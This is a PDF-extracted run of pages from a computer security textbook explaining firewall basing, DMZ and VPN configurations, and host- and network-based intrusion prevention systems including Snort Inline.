       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 322, 'page_label': '321'}, page_content='9.4 / FIREWALL BASING  321\\n• Only the services that the network administrator considers essential ar e \\ninstalled on the bastion host. These could include proxy applications for DNS, \\nFTP , HTTP , and SMTP .\\n• The bastion host may require additional authentication before a user is allowed \\naccess to the proxy services. In addition, each proxy service may require its own \\nauthentication before granting user access.\\n• Each proxy is configured to support only a subset of the standard application’s \\ncommand set.\\n• Each proxy is configur ed to allow access only to specific host systems. This \\nmeans that the limited command/feature set may be applied only to a subset of \\nsystems on the protected network.\\n• Each proxy maintains detailed audit information by logging all tr affic, each \\nconnection, and the duration of each connection. The audit log is an essential \\ntool for discovering and terminating intruder attacks.\\n• Each proxy module is a very small software package specifically designed for \\nnetwork security. Because of its relative simplicity, it is easier to check such \\nmodules for security flaws. For example, a typical UNIX mail application \\nmay contain over 20,000 lines of code, while a mail proxy may contain fewer \\nthan 1,000.\\n• Each proxy is independent of other pr oxies on the bastion host. If there is a \\nproblem with the operation of any proxy, or if a future vulnerability is dis -\\ncovered, it can be uninstalled without affecting the operation of the other \\nproxy applications. In addition, if the user population requires support for a \\nnew service, the network administrator can easily install the required proxy \\non the bastion host.\\n• A proxy generally performs no disk access other than to read its initial configu-\\nration file. Hence, the portions of the file system containing executable code \\ncan be made read-only. This makes it difficult for an intruder to install Trojan \\nhorse sniffers or other dangerous files on the bastion host.\\n• Each proxy runs as a nonprivileged user in a private and secured directory on \\nthe bastion host.\\nHost-Based Firewalls\\nA host-based firewall is a software module used to secure an individual host. Such \\nmodules are available in many operating systems or can be provided as an add-on \\npackage. Like conventional stand-alone firewalls, host-resident firewalls filter and \\nrestrict the flow of packets. A common location for such firewalls is on a server. \\nThere are several advantages to the use of a server-based or workstation-based \\nfirewall:\\n• Filtering rules can be tailored to the host environment. Specific corporate secu-\\nrity policies for servers can be implemented, with different filters for servers \\nused for different application.\\n• Protection is provided independent of topology. Thus, both internal and exter-\\nnal attacks must pass through the firewall.\\nM09_STAL0611_04_GE_C09.indd   321 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 323, 'page_label': '322'}, page_content='322  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\n• Used in conjunction with stand-alone firewalls, the host-based firewall provides \\nan additional layer of protection. A new type of server can be added to the \\nnetwork, with its own firewall, without the necessity of altering the network \\nfirewall configuration.\\nNetwork Device Firewall\\nFirewall functions, especially packet filtering and stateful inspection capabilities, are \\ncommonly provided in network devices such as routers and switches to monitor and \\nfilter packet flows through the device. They are used to provide additional layers of \\nprotection in conjunction with bastion hosts and host-based firewalls.\\nVirtual Firewall\\nIn a virtualized environment, rather than using physically separate devices as server, \\nswitches, routers, or firewall bastion hosts, there may be virtualized versions of these, \\nsharing common physical hardware. Firewall capabilities may also be provided in the \\nhypervisor that manages the virtual machines in this environment. We will discuss \\nthese alternatives further in Section 12.8.\\nPersonal Firewall\\nA personal firewall controls the traffic between a personal computer or workstation \\non one side and the Internet or enterprise network on the other side. Personal fire -\\nwall functionality can be used in the home environment and on corporate intranets. \\nTypically, the personal firewall is a software module on the personal computer. In \\na home environment with multiple computers connected to the Internet, firewall \\nfunctionality can also be housed in a router that connects all of the home computers \\nto a DSL, cable modem, or other Internet interface.\\nPersonal firewalls are typically much less complex than either server-based \\nfirewalls or stand-alone firewalls. The primary role of the personal firewall is to deny \\nunauthorized remote access to the computer. The firewall can also monitor outgoing \\nactivity in an attempt to detect and block worms and other malware.\\nPersonal firewall capabilities are provided by the netfilter package on Linux sys-\\ntems, the pf package on BSD and MacOS systems, or by the Windows Firewall. These \\npackages may be configured on the command-line, or with a GUI  front-end. When \\nsuch a personal firewall is enabled, all inbound connections are usually denied except \\nfor those the user explicitly permits. Outbound connections are usually allowed. The \\nlist of inbound services that can be selectively re-enabled, with their port numbers, \\nmay include the following common services:\\n• Personal file sharing (548, 427)\\n• Windows sharing (139)\\n• Personal Web sharing (80, 427)\\n• Remote login—SSH (22)\\n• FTP access (20-21, 1024-65535 from 20-21)\\n• Printer sharing (631, 515)\\n• IChat Rendezvous (5297, 5298)\\nM09_STAL0611_04_GE_C09.indd   322 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 324, 'page_label': '323'}, page_content='9.5 / FIREWALL LOCATION AND CONFIGuRATIONS  323\\n• iTunes Music Sharing (3869)\\n• CVS (2401)\\n• Gnutella/Limewire (6346)\\n• ICQ (4000)\\n• IRC (194)\\n• MSN Messenger (6891 -6900)\\n• Network Time (123)\\n• Retrospect (497)\\n• SMB (without netbios–445)\\n• VNC (5900-5902)\\n• WebSTAR Admin (1080, 1443)\\nWhen FTP access is enabled, ports 20 and 21 on the local machine are opened \\nfor FTP; if others connect to this computer from ports 20 or 21, the ports 1024 through \\n65535 are open.\\nFor increased protection, advanced firewall features may be configured. For \\nexample, stealth mode hides the system on the Internet by dropping unsolicited \\ncommunication packets, making it appear as though the system is not present. UDP \\npackets can be blocked, restricting network traffic to TCP packets only for open \\nports. The firewall also supports logging, an important tool for checking on unwanted \\nactivity. Other types of personal firewall allow the user to specify that only selected \\n applications, or applications signed by a valid certificate authority, may provide ser-\\nvices accessed from the network.\\n 9.5 FIREWALL LOCATION AND CONFIGURATIONS\\nAs Figure 9.1a indicates, a firewall is positioned to provide a protective barrier \\nbetween an external (potentially untrusted) source of traffic and an internal net -\\nwork. With that general principle in mind, a security administrator must decide on \\nthe location and on the number of firewalls needed. In this section, we look at some \\ncommon options.\\nDMZ Networks\\nFigure 9.2 illustrates a common firewall configuration that includes an additional \\nnetwork segment between an internal and an external firewall (see also Figure 8.5). \\nAn external firewall is placed at the edge of a local or enterprise network, just inside \\nthe boundary router that connects to the Internet or some wide area network (WAN). \\nOne or more internal firewalls protect the bulk of the enterprise network. Between \\nthese two types of firewalls are one or more networked devices in a region referred \\nto as a DMZ (demilitarized zone) network. Systems that are externally accessible but \\nneed some protections are usually located on DMZ networks. Typically, the systems \\nin the DMZ require or foster external connectivity, such as a corporate website, an \\ne-mail server, or a DNS (domain name system) server.\\nM09_STAL0611_04_GE_C09.indd   323 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 325, 'page_label': '324'}, page_content='324  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\nThe external firewall provides a measure of access control and protection for \\nthe DMZ systems consistent with their need for external connectivity. The external \\nfirewall also provides a basic level of protection for the remainder of the enterprise \\nnetwork. In this type of configuration, internal firewalls serve three purposes:\\n1. The internal firewall adds more stringent filtering capability, compared to the \\nexternal firewall, in order to protect enterprise servers and workstations from \\nexternal attack.\\nFigure 9.2 Example Firewall Configuration\\nInternet\\nWeb\\nservers(s)\\nE-mail\\nserver\\nInternal protected network\\nApplication and database servers\\nWorkstations\\nLAN\\nswitch\\nInternal\\nf irewall\\nLAN\\nswitch\\nExternal\\nf irewall\\nBoundary\\nrouter\\nDNS\\nserver\\nInternal DMZ network\\nM09_STAL0611_04_GE_C09.indd   324 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 326, 'page_label': '325'}, page_content='9.5 / FIREWALL LOCATION AND CONFIGuRATIONS  325\\n2. The internal firewall provides two-way protection with respect to the DMZ. First, \\nthe internal firewall protects the remainder of the network from attacks launched \\nfrom DMZ systems. Such attacks might originate from worms, rootkits, bots, or \\nother malware lodged in a DMZ system. Second, an internal firewall can protect \\nthe DMZ systems from attack from the internal protected network.\\n3. Multiple internal firewalls can be used to pr otect portions of the internal net-\\nwork from each other. Figure 8.5 (Example of NIDS Sensor Deployment) \\nshows a configuration, in which the internal servers are protected from internal \\nworkstations and vice versa. It also illustrates the common practice of placing \\nthe DMZ on a different network interface on the external firewall from that \\nused to access the internal networks.\\nVirtual Private Networks\\nIn today’s distributed computing environment, the virtual private network  (VPN) \\noffers an attractive solution to network managers. In essence, a VPN consists of a set \\nof computers that interconnect by means of a relatively unsecure network and that \\nmake use of encryption and special protocols to provide security. At each corporate \\nsite, workstations, servers, and databases are linked by one or more LANs. The Inter-\\nnet or some other public network can be used to interconnect sites, providing a cost \\nsavings over the use of a private network and offloading the WAN management task \\nto the public network provider. That same public network provides an access path \\nfor telecommuters and other mobile employees to log on to corporate systems from \\nremote sites.\\nBut the manager faces a fundamental requirement: security. Use of a public \\nnetwork exposes corporate traffic to eavesdropping and provides an entry point for \\nunauthorized users. To counter this problem, a VPN is needed. In essence, a VPN \\nuses encryption and authentication in the lower protocol layers to provide a secure \\nconnection through an otherwise insecure network, typically the Internet. VPNs are \\ngenerally cheaper than real private networks using private lines but rely on having \\nthe same encryption and authentication system at both ends. The encryption may be \\nperformed by firewall software or possibly by routers. The most common protocol \\nmechanism used for this purpose is at the IP level and is known as IPSec.\\nFigure 9. 3 is a typical scenario of IPSec usage. 1 An organization maintains \\nLANs at dispersed locations. Nonsecure IP traffic is used on each LAN. For traffic \\noff site, through some sort of private or public WAN, IPSec protocols are used. These \\nprotocols operate in networking devices, such as a router or firewall, that connect \\neach LAN to the outside world. The IPSec networking device will typically encrypt \\nand compress all traffic going into the WAN and decrypt and uncompress traffic \\ncoming from the WAN; authentication may also be provided. These operations are \\ntransparent to workstations and servers on the LAN. Secure transmission is also pos-\\nsible with individual users who dial into the WAN. Such user workstations must \\nimplement the IPSec protocols to provide security. They must also implement high \\nlevels of host security, as they are directly connected to the wider Internet. This makes \\nthem an attractive target for attackers attempting to access the corporate network.\\n1Details of IPSec will be provided in Chapter 22. For this discussion, all that we need to know is that IPSec \\nadds one or more additional headers to the IP packet to support encryption and authentication functions.\\nM09_STAL0611_04_GE_C09.indd   325 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 327, 'page_label': '326'}, page_content='326  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\nA logical means of implementing an IPSec is in a firewall, as shown in \\n Figure\\xa09.3. If IPSec is implemented in a separate box behind (internal to) the fire -\\nwall, then VPN traffic passing through the firewall in both directions is encrypted. \\nIn this case, the firewall is unable to perform its filtering function or other security \\nfunctions, such as access control, logging, or scanning for viruses. IPSec could be \\nimplemented in the boundary router, outside the firewall. However, this device \\nis likely to be less secure than the firewall, and thus less desirable as an IPSec \\nplatform.\\nDistributed Firewalls\\nA distributed firewall configuration involves stand-alone firewall devices plus host-\\nbased firewalls working together under a central administrative control. Figure 9.4 \\nsuggests a distributed firewall configuration. Administrators can configure host-\\nresident firewalls on hundreds of servers and workstation as well as configure per -\\nsonal firewalls on local and remote user systems. Tools let the network administrator \\nset policies and monitor security across the entire network. These firewalls protect \\nagainst internal attacks and provide protection tailored to specific machines and \\napplications. Stand-alone firewalls provide global protection, including internal fire-\\nwalls and an external firewall, as discussed previously.\\nWith distributed firewalls, it may make sense to establish both an internal and \\nan external DMZ. Web servers that need less protection because they have less criti-\\ncal information on them could be placed in an external DMZ, outside the external \\nFigure 9.3 A VPN Security Scenario\\nIP\\nHeader\\nIP\\nPayload\\nIP\\nHeader\\nIPSec\\nHeader\\nSecure IP\\nPayload\\nIP\\nHeader\\nIPSec\\nHeader\\nSecure IPPayload\\nIPHeader\\nIPSecHeader\\nSecure IP\\nPayload\\nIP\\nHeader\\nIP\\nPayload\\nFirewall\\nwith IPSec\\nEthernet\\nswitch\\nEthernet\\nswitch\\nUser system\\nwith IPSec\\nFirewall\\nwith IPSec\\nPublic (Internet)\\nor Private Network\\nM09_STAL0611_04_GE_C09.indd   326 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 328, 'page_label': '327'}, page_content='9.5 / FIREWALL LOCATION AND CONFIGuRATIONS  327\\nfirewall. What protection is needed is provided by host-based firewalls on these \\nservers.\\nAn important aspect of a distributed firewall configuration is security monitor-\\ning. Such monitoring typically includes log aggregation and analysis, firewall statistics, \\nand fine-grained remote monitoring of individual hosts if needed.\\nFigure 9.4 Example Distributed Firewall Configuration\\nInternet\\nRemote\\nusers\\nExternal\\nDMZ network\\nWeb\\nservers(s)\\nWeb\\nservers(s)\\nE-mail\\nserver\\nInternal protected network\\nApplication and database servers\\nWorkstations\\nHost-resident\\nf irewall\\nLAN\\nswitch\\nInternal\\nf irewall\\nExternal\\nf irewall\\nBoundary\\nrouter\\nDNS\\nserver\\nInternal DMZ network\\nLAN\\nswitch\\nM09_STAL0611_04_GE_C09.indd   327 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 329, 'page_label': '328'}, page_content='328  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\nSummary of Firewall Locations and Topologies\\nWe can now summarize the discussion from Sections 9.4 and 9.5 to define a spectrum \\nof firewall locations and topologies. The following alternatives can be identified:\\n• Host-resident firewall: This category includes personal firewall software and \\nfirewall software on servers, both physical and virtual. Such firewalls can be \\nused alone or as part of an in-depth firewall deployment.\\n• Screening router: A single router between internal and external networks with \\nstateless or full packet filtering. This arrangement is typical for small office/\\nhome office (SOHO) applications.\\n• Single bastion inline: A single firewall physical or virtual device located between \\nan internal and external router (e.g., Figure 9.1a). The firewall may implement \\nstateful filters and/or application proxies. This is the typical firewall appliance \\nconfiguration for small to medium-sized organizations.\\n• Single bastion T: Similar to single bastion inline, but has a third network inter-\\nface on bastion to a DMZ where externally visible servers are placed. Again, \\nthis is a common appliance configuration for medium to large organizations.\\n• Double bastion inline: Figure 9.2 illustrates this configuration, where the DMZ \\nis sandwiched between bastion firewalls. This configuration is common for large \\nbusinesses and government organizations.\\n• Double bastion T: Figure 8.5 illustrates this configuration. The DMZ is on a sep-\\narate network interface on the bastion firewall. This configuration is also com-\\nmon for large businesses and government organizations and may be required.\\n• Distributed firewall configuration: Illustrated in Figure 9.4. This configuration \\nis used by some large businesses and government organizations.\\n 9.6 INTRUSION PREVENTION SYSTEMS\\nA further addition to the range of security products is the intrusion prevention system \\n(IPS), also known as intrusion detection and prevention system (IDPS). It is an exten-\\nsion of an IDS that includes the capability to attempt to block or prevent detected \\nmalicious activity. Like an IDS, an IPS can be host-based, network-based, or distrib-\\nuted/hybrid, as we discussed in Chapter 8. Similarly, it can use anomaly detection to \\nidentify behavior that is not that of legitimate users, or signature/heuristic detection \\nto identify known malicious behavior.\\nOnce an IDS has detected malicious activity, it can respond by modifying \\nor blocking network packets across a perimeter or into a host, or by modifying or \\nblocking system calls by programs running on a host. Thus, a network IPS can block \\ntraffic, as a firewall does, but makes use of the types of algorithms developed for \\nIDSs to determine when to do so. It is a matter of terminology whether a network \\nIPS is considered a separate, new type of product, or simply another form of firewall.\\nHost-Based IPS\\nA host-based IPS (HIPS) can make use of either signature/heuristic or anomaly \\ndetection techniques to identify attacks. In the former case, the focus is on the specific \\nM09_STAL0611_04_GE_C09.indd   328 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 330, 'page_label': '329'}, page_content='9.6 / INTRuSION PREvENTION SySTEmS  329\\ncontent of application network traffic, or of sequences of system calls, looking for \\npatterns that have been identified as malicious. In the case of anomaly detection, the \\nIPS is looking for behavior patterns that indicate malware. Examples of the types of \\nmalicious behavior addressed by a HIPS include the following:\\n• Modification of system resources: Rootkits, Trojan horses, and backdoors oper-\\nate by changing system resources, such as libraries, directories, registry settings, \\nand user accounts.\\n• Privilege-escalation exploits: These attacks attempt to give ordinary users root \\naccess.\\n• Buffer-overflow exploits: These attacks will be described in Chapter 10.\\n• Access to e-mail contact list: Many worms spread by mailing a copy of them -\\nselves to addresses in the local system’s e-mail address book.\\n• Directory traversal: A directory traversal vulnerability in a Web server allows \\nthe hacker to access files outside the range of what a server application user \\nwould normally need to access.\\nAttacks such as these result in behaviors that can be analyzed by a HIPS. The \\nHIPS capability can be tailored to the specific platform. A set of general-purpose \\ntools may be used for a desktop or server system. Some HIPS packages are designed \\nto protect specific types of servers, such as Web servers and database servers. In this \\ncase, the HIPS looks for particular application attacks.\\nIn addition to signature and anomaly-detection techniques, a HIPS can use \\na sandbox approach. Sandboxes are especially suited to mobile code, such as Java \\napplets and scripting languages. The HIPS quarantines such code in an isolated sys-\\ntem area, then runs the code and monitors its behavior. If the code violates pre -\\ndefined policies or matches predefined behavior signatures, it is halted and prevented \\nfrom executing in the normal system environment.\\n[ROBB06a] lists the following as areas for which a HIPS typically offers desk-\\ntop protection:\\n• System calls: The kernel controls access to system resources such as memory, \\nI/O devices, and processor. To use these resources, user applications invoke \\nsystem calls to the kernel. Any exploit code will execute at least one system \\ncall. The HIPS can be configured to examine each system call for malicious \\ncharacteristics.\\n• File system access:  The HIPS can ensure that file access system calls are not \\nmalicious and meet established policy.\\n• System registry settings: The registry maintains persistent configuration infor-\\nmation about programs and is often maliciously modified to extend the life of \\nan exploit. The HIPS can ensure that the system registry maintains its integrity.\\n• Host input/output:  I/O communications , whether local or network-based, \\ncan propagate exploit code and malware. The HIPS can examine and enforce \\nproper client interaction with the network and its interaction with other devices.\\nThe Role of hips Many industry observers see the enterprise endpoint, including \\ndesktop and laptop systems, as now the main target for hackers and criminals, more \\nso than network devices [ROBB06b]. Thus, security vendors are focusing more on \\nM09_STAL0611_04_GE_C09.indd   329 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 331, 'page_label': '330'}, page_content='330  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\ndeveloping endpoint security products. Traditionally, endpoint security has been pro-\\nvided by a collection of distinct products, such as antivirus, antispyware, antispam, and \\npersonal firewalls. The HIPS approach is an effort to provide an integrated, single-\\nproduct suite of functions. The advantages of the integrated HIPS approach are that \\nthe various tools work closely together, threat prevention is more comprehensive, \\nand management is easier.\\nIt may be tempting to think that endpoint security products such as HIPS, if \\nsophisticated enough, eliminate or at least reduce the need for network-level devices. \\nFor example, the San Diego Supercomputer Center reports that over a four-year \\nperiod, there were no intrusions on any of its managed machines, in a configuration \\nwith no firewalls and just endpoint security protection [SING03]. Nevertheless, a \\nmore prudent approach is to use HIPS as one element in a defense-in-depth strategy \\nthat involves network-level devices, such as either firewalls or network-based IPSs.\\nNetwork-Based IPS\\nA network-based IPS (NIPS) is in essence an inline NIDS with the authority to \\nmodify or discard packets and tear down TCP connections. As with a NIDS, a NIPS \\nmakes use of techniques such as signature/heuristic detection and anomaly detection.\\nAmong the techniques used in a NIPS but not commonly found in a firewall \\nis flow data protection. This requires that the application payload in a sequence of \\npackets be reassembled. The IPS device applies filters to the full content of the flow \\nevery time a new packet for the flow arrives. When a flow is determined to be mali-\\ncious, the latest and all subsequent packets belonging to the suspect flow are dropped.\\nIn terms of the general methods used by a NIPS device to identify malicious \\npackets, the following are typical:\\n• Pattern matching: Scans incoming packets for specific byte sequences (the sig-\\nnature) stored in a database of known attacks.\\n• Stateful matching: Scans for attack signatures in the context of a traffic stream \\nrather than individual packets.\\n• Protocol anomaly: Looks for deviation from standards set forth in RFCs.\\n• Traffic anomaly: Watches for unusual traffic activities, such as a flood of UDP \\npackets or a new service appearing on the network.\\n• Statistical anomaly: Develops baselines of normal traffic activity and through-\\nput, and alerts on deviations from those baselines.\\nDistributed or Hybrid IPS\\nThe final category of IPS is in a distributed or hybrid approach. This gathers data \\nfrom a large number of host and network-based sensors, relays this intelligence to a \\ncentral analysis system able to correlate, and analyze the data, which can then return \\nupdated signatures and behavior patterns to enable all of the coordinated systems \\nto respond and defend against malicious behavior. A number of such systems have \\nbeen proposed. One of the best known is the digital immune system.\\nDigiTal immune  sysTem The digital immune system is a comprehensive \\ndefense against malicious beha vior caused by malware, developed by IBM  \\nM09_STAL0611_04_GE_C09.indd   330 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 332, 'page_label': '331'}, page_content='9.6 / INTRuSION PREvENTION SySTEmS  331\\n[KEPH97a, KEPH97b, WHIT99], and subsequently refined by Symantec [SYMA01] \\nand incorporated into its Central Quarantine produce [SYMA05]. The motivation for \\nthis development includes the rising threat of Internet-based malware, the increasing \\nspeed of its propagation provided by the Internet, and the need to acquire a global \\nview of the situation.\\nIn response to the threat posed by these Internet-based capabilities, IBM devel-\\noped the original prototype digital immune system. This system expands on the use of \\nsandbox analysis discussed in Section 6.10 and provides a general-purpose emulation \\nand malware detection system. The objective of this system is to provide rapid response \\ntime so malware can be stamped out almost as soon as they are introduced. When new \\nmalware enters an organization, the immune system automatically captures it, analyzes \\nit, adds detection and shielding for it, removes it, and passes information about it to \\nclient systems, so the malware can be detected before it is allowed to run elsewhere.\\nThe success of the digital immune system depends on the ability of the malware \\nanalysis system to detect new and innovative malware strains. By constantly analyzing \\nand monitoring malware found in the wild, it should be possible to continually update \\nthe digital immune software to keep up with the threat.\\nFigure 9.5 shows an example of a hybrid architecture designed originally to \\ndetect worms [SIDI05]. The system works as follows (numbers in figure refer to \\nnumbers in the following list):\\n1. Sensors deployed at various network and host locations detect potential mal -\\nware scanning, infection, or execution. The sensor logic can also be incorporated \\nin IDS sensors.\\n2. The sensors send alerts and copies of detected malware to a central server, which \\ncorrelates and analyzes this information. The correlation server determines the \\nlikelihood that malware is being observed and its key characteristics.\\n3. The server forwards its information to a protected environment, where the poten-\\ntial malware may be sandboxed for analysis and testing.\\n4. The protected system tests the suspicious software against an appropriately instru-\\nmented version of the targeted application to identify the vulnerability.\\n5. The protected system generates one or more software patches and tests these.\\n6. If the pat ch is not susceptible to the infection and does not compromise the \\napplication’s functionality, the system sends the patch to the application host \\nto update the targeted application.\\nSnort Inline\\nWe introduced Snort in Section 8.9 as a lightweight intrusion detection system. \\nA\\xa0modified version of Snort, known as Snort Inline [KURU12], enhances Snort to \\nfunction as an intrusion prevention system. Snort Inline adds three new rule types \\nthat provide intrusion prevention features:\\n• Drop: Snort rejects a packet based on the options defined in the rule and logs \\nthe result.\\n• Reject: Snort rejects a packet and logs the result. In addition, an error message \\nis returned. In the case of TCP , this is a TCP reset message, which resets the TCP \\nM09_STAL0611_04_GE_C09.indd   331 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 333, 'page_label': '332'}, page_content='332  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\nconnection. In the case of UDP , an ICMP port unreachable message is sent to \\nthe originator of the UDP packet.\\n• Sdrop: Snort rejects a packet but does not log the packet.\\nSnort Inline also includes a replace option, which allows the Snort user to \\nmodify packets rather than drop them. This feature is useful for a honeypot imple -\\nmentation [SPIT03]. Instead of blocking detected attacks, the honeypot modifies \\nand disables them by modifying packet content. Attackers launch their exploits, \\nwhich travel the Internet and hit their intended targets, but Snort Inline disables the \\nattacks, which ultimately fail. The attackers see the failure but cannot figure out why \\nit occurred. The honeypot can continue to monitor the attackers while reducing the \\nrisk of harming remote systems.\\n 9.7 EXAMPLE: UNIFIED THREAT MANAGEMENT PRODUCTS\\nIn the past few chapters, we have reviewed a number of approaches to countering mali-\\ncious software and network-based attacks, including antivirus and antiworm products, \\nIPS and IDS, and firewalls. The implementation of all of these systems can provide \\nan organization with a defense in depth using multiple layers of  filters and defense \\nmechanisms to thwart attacks. The downside of such a piecemeal implementation is \\nthe need to configure, deploy, and manage a range of devices and  software packages. \\nIn addition, deploying a number of devices in sequence can reduce performance.\\nFigure 9.5 Placement of Malware Monitors \\nSource: Based on [SIDI05]. Sidiroglou, S., and Keromytis, A. “Countering Network \\nWorms\\xa0Through Automatic Patch Generation.” , Columbia University, Figure 1, page 3,  \\nNovember-December 2005. http://www1.cs.columbia.edu/~angelos/Papers/2005/j6ker3 \\n.pdf  IEEE.\\nInternet\\nRemote sensor\\nHoneypot\\nPassive\\nsensor\\nFirewall\\nsensor\\nCorrelation\\nserver\\nApplication Host\\nInstrumented applications\\nSandboxed\\nenvironment\\nEnterprise network\\nHypothesis testing\\nand analysis\\nPatch\\ngeneration\\n3. Forward\\nfeatures\\n5. Possible fix generation\\n6. Application update\\n4. Vulnerability \\ntesting and \\nidentification\\n1. Malware scanning \\nor infection attempts\\n2. Notiﬁcations\\n1. Malware  \\n   execution\\nM09_STAL0611_04_GE_C09.indd   332 10/11/17   2:59 PM'),\n",
